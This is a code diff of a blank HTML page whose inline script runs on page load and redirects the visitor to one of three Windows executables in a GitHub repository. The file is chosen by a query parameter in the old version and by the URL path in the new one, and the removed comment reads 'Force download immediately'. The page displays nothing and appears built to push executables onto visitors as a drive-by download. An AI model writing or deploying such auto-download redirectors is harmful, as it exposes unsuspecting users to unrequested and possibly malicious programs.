@@ -2,30 +2,31 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <title></title>
     <style>
-        body {
-            background: #FFFFF;
-            margin: 0;
-            padding: 0;
+        body { 
+            background: #ffffff; 
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden;
         }
     </style>
     <script>
-        // Auto-download immediately
-        (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const file = urlParams.get('file');
-            
-            const downloadUrls = {
-                '1': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
-                '2': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
-                '3': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/3.exe'
-            };
-            
-            if (file && downloadUrls[file]) {
-                // Force download immediately
-                window.location.replace(downloadUrls[file]);
-            }
-        })();
+        // Get current path
+        const path = window.location.pathname;
+        const filename = path.split('/').pop();
+        
+        // File mapping
+        const files = {
+            '1.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
+            '2.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
+            '3.exe': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/3.exe'
+        };
+        
+        // Redirect if file exists
+        if (files[filename]) {
+            window.location.href = files[filename];
+        }
     </script>
 </head>
 <body>
